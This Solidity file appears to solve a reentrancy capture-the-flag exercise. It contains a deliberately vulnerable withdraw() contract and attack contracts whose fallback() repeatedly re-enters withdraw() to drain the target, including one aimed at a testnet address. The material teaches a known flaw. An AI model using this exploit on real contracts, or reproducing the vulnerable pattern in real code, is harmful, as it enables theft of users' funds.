// SPDX-License-Identifier: MIT

// exercise code changed to sub 0.8.0 to allow underflows & removed
// use of SafeMath as it is only used in donate() which we don't
// exploit and wouldn't compile as I'm using latest openzeppelin
pragma solidity >=0.6.8 <0.7.5;

contract Reentrance {

  //using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to] + msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}


// solution used by unit test
// see https://solidity-by-example.org/hacks/re-entrancy/
// contract is vulnerable because it performs state changes after send()
// and uses no re-entrancy guard techniques.
// attack contract implements receive() or fallback() function to keep calling
// withdraw() until vulnerable contract drained.
contract ReentranceAttack {
   Reentrance reentrance;
   uint private vulnContractBalance;
   uint private attackAmount;

  constructor(address payable _reentrance) public {
    reentrance =  Reentrance(_reentrance);
  }

  function attack() public payable {
    require(msg.value >= 0, "attack requires ether");

    vulnContractBalance = address(reentrance).balance;
    attackAmount        = msg.value;

    // first donate to pass check in Reentrance.Withdraw()
    reentrance.donate{value: attackAmount}(address(this));
    // then invoke vulnerable function
    reentrance.withdraw(attackAmount);
  }

  // called by vulnerable contract when attack contract calls withdraw()
  fallback() external payable {
    vulnContractBalance = address(reentrance).balance;

    if (vulnContractBalance > 0) {
      attackAmount = attackAmount > vulnContractBalance ? attackAmount - vulnContractBalance : attackAmount;
      reentrance.withdraw(attackAmount);
    }
  }
}


// solution used to deploy live to testnet
pragma solidity >=0.6.8 <0.7.5;

// vulnerable contract stub with required function
contract ReentranceLive {
  function donate(address _to) public payable {}
  function withdraw(uint _amount) public {}
}

// attack contract
contract ReentranceAttackLive {
  // todo: change this address to your vulnerable contract instance address
  // before deploying this file to testnet via remix
  address payable REENTRANCE_ADDRESS = payable(0x386025119d6187c0770F38f1d89224a8ADF1AaB9);
  uint private vulnContractBalance;
  uint private attackAmount;

  ReentranceLive reentrance;

  constructor() public {
    reentrance = ReentranceLive(REENTRANCE_ADDRESS);
  }

  function attack() public payable {
    require(msg.value >= 0, "attack requires ether");

    vulnContractBalance = address(reentrance).balance;
    attackAmount        = msg.value;

    // first donate to pass check in Reentrance.Withdraw()
    reentrance.donate{value: attackAmount}(address(this));
    // then invoke vulnerable function
    reentrance.withdraw(attackAmount);
  }

  // called by vulnerable contract when attack contract calls withdraw()
  fallback() external payable {
    vulnContractBalance = address(reentrance).balance;

    if (vulnContractBalance > 0) {
      attackAmount = attackAmount > vulnContractBalance ? attackAmount - vulnContractBalance : attackAmount;
      reentrance.withdraw(attackAmount);
    }
  }
}
